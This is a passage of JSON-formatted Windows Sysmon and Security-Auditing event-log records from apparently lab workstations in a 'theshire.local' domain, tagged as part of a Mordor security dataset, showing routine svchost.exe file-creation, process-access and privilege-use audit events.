{"Keywords":-9223372036854775808,"SeverityValue":2,"EventReceivedTime":"2020-09-21 19:19:01","EventID":11,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3392,"Channel":"Microsoft-Windows-Sysmon/Operational","host":"wec.internal.cloudapp.net","AccountType":"User","UserID":"S-1-5-18","ProcessGuid":"{d273d0f0-e868-5f64-2700-000000000800}","ThreadID":5552,"EventType":"INFO","Opcode":"Info","EventTime":"2020-09-21 19:18:58","@timestamp":"2020-09-21T23:19:01.422Z","TargetFilename":"C:\\Windows\\ServiceState\\EventLog\\Data\\lastalive1.dat","SourceModuleType":"im_msvistalog","port":64545,"AccountName":"SYSTEM","RecordNumber":3591373,"Task":11,"Domain":"NT AUTHORITY","@version":"1","OpcodeValue":0,"CreationUtcTime":"2020-09-18 17:04:38.756","SourceModuleName":"eventlog","Severity":"INFO","SourceName":"Microsoft-Windows-Sysmon","Version":2,"Image":"C:\\windows\\System32\\svchost.exe","Category":"File created (rule: FileCreate)","UtcTime":"2020-09-21 23:18:58.794","Hostname":"WORKSTATION6.theshire.local","RuleName":"-","tags":["mordorDataset"]}
{"Keywords":-9223372036854775808,"SeverityValue":2,"SourceImage":"C:\\windows\\system32\\svchost.exe","EventID":10,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3172,"Channel":"Microsoft-Windows-Sysmon/Operational","host":"wec.internal.cloudapp.net","AccountType":"User","UserID":"S-1-5-18","SourceProcessGUID":"{b34bc01c-226b-5f69-1200-000000000900}","ThreadID":4048,"TargetImage":"C:\\windows\\System32\\svchost.exe","GrantedAccess":"0x1000","EventType":"INFO","Opcode":"Info","EventTime":"2020-09-21 19:19:00","EventReceivedTime":"2020-09-21 19:19:01","@timestamp":"2020-09-21T23:19:01.422Z","SourceModuleType":"im_msvistalog","port":64545,"AccountName":"SYSTEM","RecordNumber":3227046,"SourceProcessId":"60","SourceThreadId":"5728","Task":10,"Domain":"NT AUTHORITY","@version":"1","OpcodeValue":0,"SourceModuleName":"eventlog","TargetProcessGUID":"{b34bc01c-2271-5f69-4a00-000000000900}","Severity":"INFO","SourceName":"Microsoft-Windows-Sysmon","Version":3,"TargetProcessId":"2428","Category":"Process accessed (rule: ProcessAccess)","CallTrace":"C:\\windows\\SYSTEM32\\ntdll.dll+9c534|C:\\windows\\System32\\KERNELBASE.dll+6aec5|c:\\windows\\system32\\lsm.dll+10225|C:\\windows\\System32\\RPCRT4.dll+76a53|C:\\windows\\System32\\RPCRT4.dll+da036|C:\\windows\\System32\\RPCRT4.dll+37b1c|C:\\windows\\System32\\RPCRT4.dll+54998|C:\\windows\\System32\\RPCRT4.dll+2c951|C:\\windows\\System32\\RPCRT4.dll+2c20b|C:\\windows\\System32\\RPCRT4.dll+1a86f|C:\\windows\\System32\\RPCRT4.dll+19d1a|C:\\windows\\System32\\RPCRT4.dll+19301|C:\\windows\\System32\\RPCRT4.dll+18d6e|C:\\windows\\System32\\RPCRT4.dll+169a5|C:\\windows\\SYSTEM32\\ntdll.dll+333ed|C:\\windows\\SYSTEM32\\ntdll.dll+34142|C:\\windows\\System32\\KERNEL32.DLL+17bd4|C:\\windows\\SYSTEM32\\ntdll.dll+6ce51","UtcTime":"2020-09-21 23:18:59.999","Hostname":"WORKSTATION5.theshire.local","RuleName":"-","tags":["mordorDataset"]}
{"Keywords":-9223372036854775808,"SeverityValue":2,"SourceImage":"C:\\windows\\system32\\svchost.exe","EventID":10,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3172,"Channel":"Microsoft-Windows-Sysmon/Operational","host":"wec.internal.cloudapp.net","AccountType":"User","UserID":"S-1-5-18","SourceProcessGUID":"{b34bc01c-226b-5f69-1200-000000000900}","ThreadID":4048,"TargetImage":"C:\\windows\\System32\\svchost.exe","GrantedAccess":"0x1000","EventType":"INFO","Opcode":"Info","EventTime":"2020-09-21 19:19:00","EventReceivedTime":"2020-09-21 19:19:01","@timestamp":"2020-09-21T23:19:01.422Z","SourceModuleType":"im_msvistalog","port":64545,"AccountName":"SYSTEM","RecordNumber":3227047,"SourceProcessId":"60","SourceThreadId":"5728","Task":10,"Domain":"NT AUTHORITY","@version":"1","OpcodeValue":0,"SourceModuleName":"eventlog","TargetProcessGUID":"{b34bc01c-2271-5f69-4a00-000000000900}","Severity":"INFO","SourceName":"Microsoft-Windows-Sysmon","Version":3,"TargetProcessId":"2428","Category":"Process accessed (rule: ProcessAccess)","CallTrace":"C:\\windows\\SYSTEM32\\ntdll.dll+9c534|C:\\windows\\System32\\KERNELBASE.dll+6aec5|c:\\windows\\system32\\lsm.dll+108a0|C:\\windows\\System32\\RPCRT4.dll+76a53|C:\\windows\\System32\\RPCRT4.dll+da036|C:\\windows\\System32\\RPCRT4.dll+37b1c|C:\\windows\\System32\\RPCRT4.dll+54998|C:\\windows\\System32\\RPCRT4.dll+2c951|C:\\windows\\System32\\RPCRT4.dll+2c20b|C:\\windows\\System32\\RPCRT4.dll+1a86f|C:\\windows\\System32\\RPCRT4.dll+19d1a|C:\\windows\\System32\\RPCRT4.dll+19301|C:\\windows\\System32\\RPCRT4.dll+18d6e|C:\\windows\\System32\\RPCRT4.dll+169a5|C:\\windows\\SYSTEM32\\ntdll.dll+333ed|C:\\windows\\SYSTEM32\\ntdll.dll+34142|C:\\windows\\System32\\KERNEL32.DLL+17bd4|C:\\windows\\SYSTEM32\\ntdll.dll+6ce51","UtcTime":"2020-09-21 23:18:59.999","Hostname":"WORKSTATION5.theshire.local","RuleName":"-","tags":["mordorDataset"]}
{"Keywords":-9223372036854775808,"SeverityValue":2,"SourceImage":"C:\\windows\\system32\\svchost.exe","EventID":10,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3172,"Channel":"Microsoft-Windows-Sysmon/Operational","host":"wec.internal.cloudapp.net","AccountType":"User","UserID":"S-1-5-18","SourceProcessGUID":"{b34bc01c-226b-5f69-1200-000000000900}","ThreadID":4048,"TargetImage":"C:\\windows\\System32\\svchost.exe","GrantedAccess":"0x1000","EventType":"INFO","Opcode":"Info","EventTime":"2020-09-21 19:19:00","EventReceivedTime":"2020-09-21 19:19:01","@timestamp":"2020-09-21T23:19:01.423Z","SourceModuleType":"im_msvistalog","port":64545,"AccountName":"SYSTEM","RecordNumber":3227048,"SourceProcessId":"60","SourceThreadId":"5728","Task":10,"Domain":"NT AUTHORITY","@version":"1","OpcodeValue":0,"SourceModuleName":"eventlog","TargetProcessGUID":"{b34bc01c-2271-5f69-4a00-000000000900}","Severity":"INFO","SourceName":"Microsoft-Windows-Sysmon","Version":3,"TargetProcessId":"2428","Category":"Process accessed (rule: ProcessAccess)","CallTrace":"C:\\windows\\SYSTEM32\\ntdll.dll+9c534|C:\\windows\\System32\\KERNELBASE.dll+6aec5|c:\\windows\\system32\\lsm.dll+106fe|C:\\windows\\System32\\RPCRT4.dll+76a53|C:\\windows\\System32\\RPCRT4.dll+da036|C:\\windows\\System32\\RPCRT4.dll+37b1c|C:\\windows\\System32\\RPCRT4.dll+54998|C:\\windows\\System32\\RPCRT4.dll+2c951|C:\\windows\\System32\\RPCRT4.dll+2c20b|C:\\windows\\System32\\RPCRT4.dll+1a86f|C:\\windows\\System32\\RPCRT4.dll+19d1a|C:\\windows\\System32\\RPCRT4.dll+19301|C:\\windows\\System32\\RPCRT4.dll+18d6e|C:\\windows\\System32\\RPCRT4.dll+169a5|C:\\windows\\SYSTEM32\\ntdll.dll+333ed|C:\\windows\\SYSTEM32\\ntdll.dll+34142|C:\\windows\\System32\\KERNEL32.DLL+17bd4|C:\\windows\\SYSTEM32\\ntdll.dll+6ce51","UtcTime":"2020-09-21 23:18:59.999","Hostname":"WORKSTATION5.theshire.local","RuleName":"-","tags":["mordorDataset"]}
{"Keywords":-9223372036854775808,"SeverityValue":2,"SourceImage":"C:\\windows\\system32\\svchost.exe","EventID":10,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3172,"Channel":"Microsoft-Windows-Sysmon/Operational","host":"wec.internal.cloudapp.net","AccountType":"User","UserID":"S-1-5-18","SourceProcessGUID":"{b34bc01c-226b-5f69-1200-000000000900}","ThreadID":4048,"TargetImage":"C:\\windows\\System32\\svchost.exe","GrantedAccess":"0x1000","EventType":"INFO","Opcode":"Info","EventTime":"2020-09-21 19:19:00","EventReceivedTime":"2020-09-21 19:19:01","@timestamp":"2020-09-21T23:19:01.423Z","SourceModuleType":"im_msvistalog","port":64545,"AccountName":"SYSTEM","RecordNumber":3227049,"SourceProcessId":"60","SourceThreadId":"6692","Task":10,"Domain":"NT AUTHORITY","@version":"1","OpcodeValue":0,"SourceModuleName":"eventlog","TargetProcessGUID":"{b34bc01c-2271-5f69-4a00-000000000900}","Severity":"INFO","SourceName":"Microsoft-Windows-Sysmon","Version":3,"TargetProcessId":"2428","Category":"Process accessed (rule: ProcessAccess)","CallTrace":"C:\\windows\\SYSTEM32\\ntdll.dll+9c534|C:\\windows\\System32\\KERNELBASE.dll+6aec5|c:\\windows\\system32\\lsm.dll+f6ba|C:\\windows\\System32\\RPCRT4.dll+76a53|C:\\windows\\System32\\RPCRT4.dll+da036|C:\\windows\\System32\\RPCRT4.dll+37b1c|C:\\windows\\System32\\RPCRT4.dll+54998|C:\\windows\\System32\\RPCRT4.dll+2c951|C:\\windows\\System32\\RPCRT4.dll+2c20b|C:\\windows\\System32\\RPCRT4.dll+1a86f|C:\\windows\\System32\\RPCRT4.dll+19d1a|C:\\windows\\System32\\RPCRT4.dll+19301|C:\\windows\\System32\\RPCRT4.dll+18d6e|C:\\windows\\System32\\RPCRT4.dll+169a5|C:\\windows\\SYSTEM32\\ntdll.dll+333ed|C:\\windows\\SYSTEM32\\ntdll.dll+34142|C:\\windows\\System32\\KERNEL32.DLL+17bd4|C:\\windows\\SYSTEM32\\ntdll.dll+6ce51","UtcTime":"2020-09-21 23:18:59.999","Hostname":"WORKSTATION5.theshire.local","RuleName":"-","tags":["mordorDataset"]}
{"Keywords":-9223372036854775808,"SeverityValue":2,"SourceImage":"C:\\windows\\system32\\svchost.exe","EventID":10,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3172,"Channel":"Microsoft-Windows-Sysmon/Operational","host":"wec.internal.cloudapp.net","AccountType":"User","UserID":"S-1-5-18","SourceProcessGUID":"{b34bc01c-226b-5f69-1200-000000000900}","ThreadID":4048,"TargetImage":"C:\\windows\\System32\\svchost.exe","GrantedAccess":"0x1000","EventType":"INFO","Opcode":"Info","EventTime":"2020-09-21 19:19:00","EventReceivedTime":"2020-09-21 19:19:01","@timestamp":"2020-09-21T23:19:01.424Z","SourceModuleType":"im_msvistalog","port":64545,"AccountName":"SYSTEM","RecordNumber":3227050,"SourceProcessId":"60","SourceThreadId":"6692","Task":10,"Domain":"NT AUTHORITY","@version":"1","OpcodeValue":0,"SourceModuleName":"eventlog","TargetProcessGUID":"{b34bc01c-2271-5f69-4a00-000000000900}","Severity":"INFO","SourceName":"Microsoft-Windows-Sysmon","Version":3,"TargetProcessId":"2428","Category":"Process accessed (rule: ProcessAccess)","CallTrace":"C:\\windows\\SYSTEM32\\ntdll.dll+9c534|C:\\windows\\System32\\KERNELBASE.dll+6aec5|c:\\windows\\system32\\lsm.dll+f97f|c:\\windows\\system32\\lsm.dll+f7ad|C:\\windows\\System32\\RPCRT4.dll+76a53|C:\\windows\\System32\\RPCRT4.dll+da036|C:\\windows\\System32\\RPCRT4.dll+37b1c|C:\\windows\\System32\\RPCRT4.dll+54998|C:\\windows\\System32\\RPCRT4.dll+2c951|C:\\windows\\System32\\RPCRT4.dll+2c20b|C:\\windows\\System32\\RPCRT4.dll+1a86f|C:\\windows\\System32\\RPCRT4.dll+19d1a|C:\\windows\\System32\\RPCRT4.dll+19301|C:\\windows\\System32\\RPCRT4.dll+18d6e|C:\\windows\\System32\\RPCRT4.dll+169a5|C:\\windows\\SYSTEM32\\ntdll.dll+333ed|C:\\windows\\SYSTEM32\\ntdll.dll+34142|C:\\windows\\System32\\KERNEL32.DLL+17bd4|C:\\windows\\SYSTEM32\\ntdll.dll+6ce51","UtcTime":"2020-09-21 23:18:59.999","Hostname":"WORKSTATION5.theshire.local","RuleName":"-","tags":["mordorDataset"]}
{"Keywords":-9223372036854775808,"SeverityValue":2,"SourceImage":"C:\\windows\\system32\\svchost.exe","EventID":10,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3172,"Channel":"Microsoft-Windows-Sysmon/Operational","host":"wec.internal.cloudapp.net","AccountType":"User","UserID":"S-1-5-18","SourceProcessGUID":"{b34bc01c-226b-5f69-1200-000000000900}","ThreadID":4048,"TargetImage":"C:\\windows\\System32\\svchost.exe","GrantedAccess":"0x1000","EventType":"INFO","Opcode":"Info","EventTime":"2020-09-21 19:19:00","EventReceivedTime":"2020-09-21 19:19:01","@timestamp":"2020-09-21T23:19:01.424Z","SourceModuleType":"im_msvistalog","port":64545,"AccountName":"SYSTEM","RecordNumber":3227051,"SourceProcessId":"60","SourceThreadId":"6692","Task":10,"Domain":"NT AUTHORITY","@version":"1","OpcodeValue":0,"SourceModuleName":"eventlog","TargetProcessGUID":"{b34bc01c-2271-5f69-4a00-000000000900}","Severity":"INFO","SourceName":"Microsoft-Windows-Sysmon","Version":3,"TargetProcessId":"2428","Category":"Process accessed (rule: ProcessAccess)","CallTrace":"C:\\windows\\SYSTEM32\\ntdll.dll+9c534|C:\\windows\\System32\\KERNELBASE.dll+6aec5|c:\\windows\\system32\\lsm.dll+f6ba|C:\\windows\\System32\\RPCRT4.dll+76a53|C:\\windows\\System32\\RPCRT4.dll+da036|C:\\windows\\System32\\RPCRT4.dll+37b1c|C:\\windows\\System32\\RPCRT4.dll+54998|C:\\windows\\System32\\RPCRT4.dll+2c951|C:\\windows\\System32\\RPCRT4.dll+2c20b|C:\\windows\\System32\\RPCRT4.dll+1a86f|C:\\windows\\System32\\RPCRT4.dll+19d1a|C:\\windows\\System32\\RPCRT4.dll+19301|C:\\windows\\System32\\RPCRT4.dll+18d6e|C:\\windows\\System32\\RPCRT4.dll+169a5|C:\\windows\\SYSTEM32\\ntdll.dll+333ed|C:\\windows\\SYSTEM32\\ntdll.dll+34142|C:\\windows\\System32\\KERNEL32.DLL+17bd4|C:\\windows\\SYSTEM32\\ntdll.dll+6ce51","UtcTime":"2020-09-21 23:18:59.999","Hostname":"WORKSTATION5.theshire.local","RuleName":"-","tags":["mordorDataset"]}
{"Keywords":-9223372036854775808,"SeverityValue":2,"SourceImage":"C:\\windows\\system32\\svchost.exe","EventID":10,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3392,"Channel":"Microsoft-Windows-Sysmon/Operational","host":"wec.internal.cloudapp.net","AccountType":"User","UserID":"S-1-5-18","SourceProcessGUID":"{d273d0f0-e867-5f64-1300-000000000800}","ThreadID":5552,"TargetImage":"C:\\windows\\System32\\svchost.exe","GrantedAccess":"0x1000","EventType":"INFO","Opcode":"Info","EventTime":"2020-09-21 19:19:00","EventReceivedTime":"2020-09-21 19:19:01","@timestamp":"2020-09-21T23:19:01.428Z","SourceModuleType":"im_msvistalog","port":64545,"AccountName":"SYSTEM","RecordNumber":3591374,"SourceProcessId":"428","SourceThreadId":"9660","Task":10,"Domain":"NT AUTHORITY","@version":"1","OpcodeValue":0,"SourceModuleName":"eventlog","TargetProcessGUID":"{d273d0f0-e875-5f64-4900-000000000800}","Severity":"INFO","SourceName":"Microsoft-Windows-Sysmon","Version":3,"TargetProcessId":"3212","Category":"Process accessed (rule: ProcessAccess)","CallTrace":"C:\\windows\\SYSTEM32\\ntdll.dll+9c534|C:\\windows\\System32\\KERNELBASE.dll+6aec5|c:\\windows\\system32\\lsm.dll+10225|C:\\windows\\System32\\RPCRT4.dll+76a53|C:\\windows\\System32\\RPCRT4.dll+da036|C:\\windows\\System32\\RPCRT4.dll+37b1c|C:\\windows\\System32\\RPCRT4.dll+54998|C:\\windows\\System32\\RPCRT4.dll+2c951|C:\\windows\\System32\\RPCRT4.dll+2c20b|C:\\windows\\System32\\RPCRT4.dll+1a86f|C:\\windows\\System32\\RPCRT4.dll+19d1a|C:\\windows\\System32\\RPCRT4.dll+19301|C:\\windows\\System32\\RPCRT4.dll+18d6e|C:\\windows\\System32\\RPCRT4.dll+169a5|C:\\windows\\SYSTEM32\\ntdll.dll+333ed|C:\\windows\\SYSTEM32\\ntdll.dll+34142|C:\\windows\\System32\\KERNEL32.DLL+17bd4|C:\\windows\\SYSTEM32\\ntdll.dll+6ce51","UtcTime":"2020-09-21 23:19:00.014","Hostname":"WORKSTATION6.theshire.local","RuleName":"-","tags":["mordorDataset"]}
{"Keywords":-9218868437227405312,"SeverityValue":4,"SubjectDomainName":"NT AUTHORITY","EventID":4673,"ProviderGuid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","ExecutionProcessID":4,"Channel":"security","host":"wec.internal.cloudapp.net","SubjectUserSid":"S-1-5-19","EventReceivedTime":"2020-09-21 19:19:01","ProcessId":"0xc8c","ThreadID":3272,"EventType":"AUDIT_FAILURE","Opcode":"Info","EventTime":"2020-09-21 19:19:00","Message":"A privileged service was called.\r\n\r\nSubject:\r\n\tSecurity ID:\t\tS-1-5-19\r\n\tAccount Name:\t\tLOCAL SERVICE\r\n\tAccount Domain:\t\tNT AUTHORITY\r\n\tLogon ID:\t\t0x3E5\r\n\r\nService:\r\n\tServer:\tSecurity\r\n\tService Name:\t-\r\n\r\nProcess:\r\n\tProcess ID:\t0xc8c\r\n\tProcess Name:\tC:\\Windows\\System32\\svchost.exe\r\n\r\nService Request Information:\r\n\tPrivileges:\t\tSeProfileSingleProcessPrivilege","PrivilegeList":"SeProfileSingleProcessPrivilege","@timestamp":"2020-09-21T23:19:01.429Z","ObjectServer":"Security","SubjectLogonId":"0x3e5","SourceModuleType":"im_msvistalog","port":64545,"ProcessName":"C:\\Windows\\System32\\svchost.exe","RecordNumber":844255,"SubjectUserName":"LOCAL SERVICE","Task":13056,"@version":"1","OpcodeValue":0,"Service":"-","SourceModuleName":"eventlog","Severity":"ERROR","SourceName":"Microsoft-Windows-Security-Auditing","Version":0,"Category":"Sensitive Privilege Use","tags":["mordorDataset"],"Hostname":"WORKSTATION6.theshire.local"}
{"Keywords":-9223372036854775808,"SeverityValue":2,"SourceImage":"C:\\windows\\system32\\svchost.exe","EventID":10,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3172,"Channel":"Microsoft-Windows-Sysmon/Operational","host":"wec.internal.cloudapp.net","AccountType":"User","UserID":"S-1-5-18","SourceProcessGUID":"{b34bc01c-226b-5f69-1200-000000000900}","ThreadID":4048,"TargetImage":"C:\\windows\\System32\\svchost.exe","GrantedAccess":"0x1000","EventType":"INFO","Opcode":"Info","EventTime":"2020-09-21 19:19:00","EventReceivedTime":"2020-09-21 19:19:01","@timestamp":"2020-09-21T23:19:01.429Z","SourceModuleType":"im_msvistalog","port":64545,"AccountName":"SYSTEM","RecordNumber":3227052,"SourceProcessId":"60","SourceThreadId":"6692","Task":10,"Domain":"NT AUTHORITY","@version":"1","OpcodeValue":0,"SourceModuleName":"eventlog","TargetProcessGUID":"{b34bc01c-2271-5f69-4a00-000000000900}","Severity":"INFO","SourceName":"Microsoft-Windows-Sysmon","Version":3,"TargetProcessId":"2428","Category":"Process accessed (rule: ProcessAccess)","CallTrace":"C:\\windows\\SYSTEM32\\ntdll.dll+9c534|C:\\windows\\System32\\KERNELBASE.dll+6aec5|c:\\windows\\system32\\lsm.dll+f97f|c:\\windows\\system32\\lsm.dll+f7ad|C:\\windows\\System32\\RPCRT4.dll+76a53|C:\\windows\\System32\\RPCRT4.dll+da036|C:\\windows\\System32\\RPCRT4.dll+37b1c|C:\\windows\\System32\\RPCRT4.dll+54998|C:\\windows\\System32\\RPCRT4.dll+2c951|C:\\windows\\System32\\RPCRT4.dll+2c20b|C:\\windows\\System32\\RPCRT4.dll+1a86f|C:\\windows\\System32\\RPCRT4.dll+19d1a|C:\\windows\\System32\\RPCRT4.dll+19301|C:\\windows\\System32\\RPCRT4.dll+18d6e|C:\\windows\\System32\\RPCRT4.dll+169a5|C:\\windows\\SYSTEM32\\ntdll.dll+333ed|C:\\windows\\SYSTEM32\\ntdll.dll+34142|C:\\windows\\System32\\KERNEL32.DLL+17bd4|C:\\windows\\SYSTEM32\\ntdll.dll+6ce51","UtcTime":"2020-09-21 23:18:59.999","Hostname":"WORKSTATION5.theshire.local","RuleName":"-","tags":["mordorDataset"]}
{"Keywords":-9223372036854775808,"SeverityValue":2,"SourceImage":"C:\\windows\\system32\\svchost.exe","EventID":10,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3392,"Channel":"Microsoft-Windows-Sysmon/Operational","host":"wec.internal.cloudapp.net","AccountType":"User","UserID":"S-1-5-18","SourceProcessGUID":"{d273d0f0-e867-5f64-1300-000000000800}","ThreadID":5552,"TargetImage":"C:\\windows\\System32\\svchost.exe","GrantedAccess":"0x1000","EventType":"INFO","Opcode":"Info","EventTime":"2020-09-21 19:19:00","EventReceivedTime":"2020-09-21 19:19:01","@timestamp":"2020-09-21T23:19:01.429Z","SourceModuleType":"im_msvistalog","port":64545,"AccountName":"SYSTEM","RecordNumber":3591375,"SourceProcessId":"428","SourceThreadId":"9660","Task":10,"Domain":"NT AUTHORITY","@version":"1","OpcodeValue":0,"SourceModuleName":"eventlog","TargetProcessGUID":"{d273d0f0-e875-5f64-4900-000000000800}","Severity":"INFO","SourceName":"Microsoft-Windows-Sysmon","Version":3,"TargetProcessId":"3212","Category":"Process accessed (rule: ProcessAccess)","CallTrace":"C:\\windows\\SYSTEM32\\ntdll.dll+9c534|C:\\windows\\System32\\KERNELBASE.dll+6aec5|c:\\windows\\system32\\lsm.dll+108a0|C:\\windows\\System32\\RPCRT4.dll+76a53|C:\\windows\\System32\\RPCRT4.dll+da036|C:\\windows\\System32\\RPCRT4.dll+37b1c|C:\\windows\\System32\\RPCRT4.dll+54998|C:\\windows\\System32\\RPCRT4.dll+2c951|C:\\windows\\System32\\RPCRT4.dll+2c20b|C:\\windows\\System32\\RPCRT4.dll+1a86f|C:\\windows\\System32\\RPCRT4.dll+19d1a|C:\\windows\\System32\\RPCRT4.dll+19301|C:\\windows\\System32\\RPCRT4.dll+18d6e|C:\\windows\\System32\\RPCRT4.dll+169a5|C:\\windows\\SYSTEM32\\ntdll.dll+333ed|C:\\windows\\SYSTEM32\\ntdll.dll+34142|C:\\windows\\System32\\KERNEL32.DLL+17bd4|C:\\windows\\SYSTEM32\\ntdll.dll+6ce51","UtcTime":"2020-09-21 23:19:00.014","Hostname":"WORKSTATION6.theshire.local","RuleName":"-","tags":["mordorDataset"]}
{"Keywords":-9218868437227405312,"SeverityValue":4,"SubjectDomainName":"NT AUTHORITY","EventID":4673,"ProviderGuid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","ExecutionProcessID":4,"Channel":"security","host":"wec.internal.cloudapp.net","SubjectUserSid":"S-1-5-19","EventReceivedTime":"2020-09-21 19:19:01","ProcessId":"0xc8c","ThreadID":3272,"EventType":"AUDIT_FAILURE","Opcode":"Info","EventTime":"2020-09-21 19:19:00","Message":"A privileged service was called.\r\n\r\nSubject:\r\n\tSecurity ID:\t\tS-1-5-19\r\n\tAccount Name:\t\tLOCAL SERVICE\r\n\tAccount Domain:\t\tNT AUTHORITY\r\n\tLogon ID:\t\t0x3E5\r\n\r\nService:\r\n\tServer:\tSecurity\r\n\tService Name:\t-\r\n\r\nProcess:\r\n\tProcess ID:\t0xc8c\r\n\tProcess Name:\tC:\\Windows\\System32\\svchost.exe\r\n\r\nService Request Information:\r\n\tPrivileges:\t\tSeProfileSingleProcessPrivilege","PrivilegeList":"SeProfileSingleProcessPrivilege","@timestamp":"2020-09-21T23:19:01.430Z","ObjectServer":"Security","SubjectLogonId":"0x3e5","SourceModuleType":"im_msvistalog","port":64545,"ProcessName":"C:\\Windows\\System32\\svchost.exe","RecordNumber":844256,"SubjectUserName":"LOCAL SERVICE","Task":13056,"@version":"1","OpcodeValue":0,"Service":"-","SourceModuleName":"eventlog","Severity":"ERROR","SourceName":"Microsoft-Windows-Security-Auditing","Version":0,"Category":"Sensitive Privilege Use","tags":["mordorDataset"],"Hostname":"WORKSTATION6.theshire.local"}
{"Keywords":-9223372036854775808,"SeverityValue":2,"SourceImage":"C:\\windows\\system32\\svchost.exe","EventID":10,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3392,"Channel":"Microsoft-Windows-Sysmon/Operational","host":"wec.internal.cloudapp.net","AccountType":"User","UserID":"S-1-5-18","SourceProcessGUID":"{d273d0f0-e867-5f64-1300-000000000800}","ThreadID":5552,"TargetImage":"C:\\windows\\System32\\svchost.exe","GrantedAccess":"0x1000","EventType":"INFO","Opcode":"Info","EventTime":"2020-09-21 19:19:00","EventReceivedTime":"2020-09-21 19:19:01","@timestamp":"2020-09-21T23:19:01.431Z","SourceModuleType":"im_msvistalog","port":64545,"AccountName":"SYSTEM","RecordNumber":3591376,"SourceProcessId":"428","SourceThreadId":"9660","Task":10,"Domain":"NT AUTHORITY","@version":"1","OpcodeValue":0,"SourceModuleName":"eventlog","TargetProcessGUID":"{d273d0f0-e875-5f64-4900-000000000800}","Severity":"INFO","SourceName":"Microsoft-Windows-Sysmon","Version":3,"TargetProcessId":"3212","Category":"Process accessed (rule: ProcessAccess)","CallTrace":"C:\\windows\\SYSTEM32\\ntdll.dll+9c534|C:\\windows\\System32\\KERNELBASE.dll+6aec5|c:\\windows\\system32\\lsm.dll+106fe|C:\\windows\\System32\\RPCRT4.dll+76a53|C:\\windows\\System32\\RPCRT4.dll+da036|C:\\windows\\System32\\RPCRT4.dll+37b1c|C:\\windows\\System32\\RPCRT4.dll+54998|C:\\windows\\System32\\RPCRT4.dll+2c951|C:\\windows\\System32\\RPCRT4.dll+2c20b|C:\\windows\\System32\\RPCRT4.dll+1a86f|C:\\windows\\System32\\RPCRT4.dll+19d1a|C:\\windows\\System32\\RPCRT4.dll+19301|C:\\windows\\System32\\RPCRT4.dll+18d6e|C:\\windows\\System32\\RPCRT4.dll+169a5|C:\\windows\\SYSTEM32\\ntdll.dll+333ed|C:\\windows\\SYSTEM32\\ntdll.dll+34142|C:\\windows\\System32\\KERNEL32.DLL+17bd4|C:\\windows\\SYSTEM32\\ntdll.dll+6ce51","UtcTime":"2020-09-21 23:19:00.014","Hostname":"WORKSTATION6.theshire.local","RuleName":"-","tags":["mordorDataset"]}
{"Keywords":-9218868437227405312,"SeverityValue":4,"SubjectDomainName":"NT AUTHORITY","EventID":4673,"ProviderGuid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","ExecutionProcessID":4,"Channel":"security","host":"wec.internal.cloudapp.net","SubjectUserSid":"S-1-5-19","EventReceivedTime":"2020-09-21 19:19:01","ProcessId":"0xc8c","ThreadID":3272,"EventType":"AUDIT_FAILURE","Opcode":"Info","EventTime":"2020-09-21 19:19:00","Message":"A privileged service was called.\r\n\r\nSubject:\r\n\tSecurity ID:\t\tS-1-5-19\r\n\tAccount Name:\t\tLOCAL SERVICE\r\n\tAccount Domain:\t\tNT AUTHORITY\r\n\tLogon ID:\t\t0x3E5\r\n\r\nService:\r\n\tServer:\tSecurity\r\n\tService Name:\t-\r\n\r\nProcess:\r\n\tProcess ID:\t0xc8c\r\n\tProcess Name:\tC:\\Windows\\System32\\svchost.exe\r\n\r\nService Request Information:\r\n\tPrivileges:\t\tSeProfileSingleProcessPrivilege","PrivilegeList":"SeProfileSingleProcessPrivilege","@timestamp":"2020-09-21T23:19:01.431Z","ObjectServer":"Security","SubjectLogonId":"0x3e5","SourceModuleType":"im_msvistalog","port":64545,"ProcessName":"C:\\Windows\\System32\\svchost.exe","RecordNumber":844257,"SubjectUserName":"LOCAL SERVICE","Task":13056,"@version":"1","OpcodeValue":0,"Service":"-","SourceModuleName":"eventlog","Severity":"ERROR","SourceName":"Microsoft-Windows-Security-Auditing","Version":0,"Category":"Sensitive Privilege Use","tags":["mordorDataset"],"Hostname":"WORKSTATION6.theshire.local"}
{"Keywords":-9223372036854775808,"SeverityValue":2,"SourceImage":"C:\\windows\\system32\\svchost.exe","EventID":10,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3172,"Channel":"Microsoft-Windows-Sysmon/Operational","host":"wec.internal.cloudapp.net","AccountType":"User","UserID":"S-1-5-18","SourceProcessGUID":"{b34bc01c-226b-5f69-1200-000000000900}","ThreadID":4048,"TargetImage":"C:\\windows\\System32\\svchost.exe","GrantedAccess":"0x1000","EventType":"INFO","Opcode":"Info","EventTime":"2020-09-21 19:19:00","EventReceivedTime":"2020-09-21 19:19:01","@timestamp":"2020-09-21T23:19:01.431Z","SourceModuleType":"im_msvistalog","port":64545,"AccountName":"SYSTEM","RecordNumber":3227053,"SourceProcessId":"60","SourceThreadId":"5728","Task":10,"Domain":"NT AUTHORITY","@version":"1","OpcodeValue":0,"SourceModuleName":"eventlog","TargetProcessGUID":"{b34bc01c-2271-5f69-4a00-000000000900}","Severity":"INFO","SourceName":"Microsoft-Windows-Sysmon","Version":3,"TargetProcessId":"2428","Category":"Process accessed (rule: 